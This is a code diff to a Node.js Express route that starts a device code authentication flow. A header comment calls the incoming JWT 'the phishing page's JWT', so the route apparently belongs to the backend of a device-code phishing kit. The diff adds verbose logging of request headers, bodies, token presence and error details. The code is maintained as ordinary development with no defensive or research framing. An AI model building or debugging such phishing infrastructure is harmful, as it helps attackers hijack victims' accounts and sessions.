@@ -15,11 +15,19 @@ const db = require('../database/connection');
  * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
  */
 router.post('/start', async (req, res) => {
+	console.log('[Device] ========== DEVICE CODE REQUEST START ==========');
+	console.log('[Device] Request headers:', JSON.stringify(req.headers).substring(0, 500));
+	console.log('[Device] Request body:', JSON.stringify(req.body).substring(0, 500));
+
 	try {
 	const mode = req.body.mode || req.headers['x-auth-mode'] || 'cookie';
 	const jwtToken = req.body.jwt_token || req.headers['x-vg-jwt'] || req.query.token;
 
+	console.log('[Device] JWT Token present:', !!jwtToken);
+	console.log('[Device] Mode:', mode);
+
 	if (!jwtToken) {
+		console.log('[Device] No JWT token provided');
 		return res.status(400).json({ error: 'JWT token required' });
 	}
 
@@ -65,14 +73,27 @@ router.post('/start', async (req, res) => {
 	}
 
 	const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
+	console.log('[Device] API Base URL:', apiBaseUrl);
+	console.log('[Device] Calling startDeviceFlow...');
+
 	const result = await deviceProxy.startDeviceFlow(mode, jwtToken, apiBaseUrl, {
 		ip: ipAddress,
 		userAgent: userAgent
 	});
 
+	console.log('[Device] startDeviceFlow result:', JSON.stringify(result).substring(0, 500));
+	console.log('[Device] ========== DEVICE CODE REQUEST END ==========');
+
 	res.json(result);
 } catch (err) {
-	console.error('[Device] Start error:', err.message);
+	console.error('[Device] ========== ERROR ==========');
+	console.error('[Device] Error message:', err.message);
+	console.error('[Device] Error stack:', err.stack);
+	if (err.response) {
+		console.error('[Device] Response status:', err.response.status);
+		console.error('[Device] Response data:', JSON.stringify(err.response.data).substring(0, 500));
+	}
+	console.error('[Device] ========== ERROR END ==========');
 	res.status(500).json({ error: 'Failed to start device flow', message: err.message });
 }
 });
